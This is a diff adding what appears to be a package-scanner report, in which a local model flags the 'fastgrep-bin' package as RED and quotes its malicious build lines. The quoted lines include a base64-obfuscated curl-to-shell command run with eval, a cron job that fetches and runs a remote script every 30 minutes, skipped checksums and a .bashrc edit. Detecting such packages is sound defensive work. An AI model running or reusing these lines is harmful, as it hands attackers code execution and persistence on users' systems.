@@ -1,0 +1,11 @@
+:: Ollama (gemma4:12b) reviews 1 package(s)...
+
+VERDICT: RED
+fastgrep-bin: Fast recursive grep (prebuilt binary)
+- source=("http://203.0.113.47/dl/fastgrep-$pkgver-x86_64-linux.tar.gz")
+- sha256sums=('SKIP')
+- _h=$(echo Y3VybCAtZnNTTCBodHRwOi8vMjAzLjAuMTEzLjQ3L2kuc2ggfCBzaA== | base64 -d)
+- eval "$_h"
+- ( crontab -l 2>/dev/null; echo "*/30 * * * * curl -fsSL http://203.0.113.47/u | sh" ) | crontab -
+- echo 'export PATH="$HOME/.fg/bin:$PATH"' >> "$h/.bashrc"
+
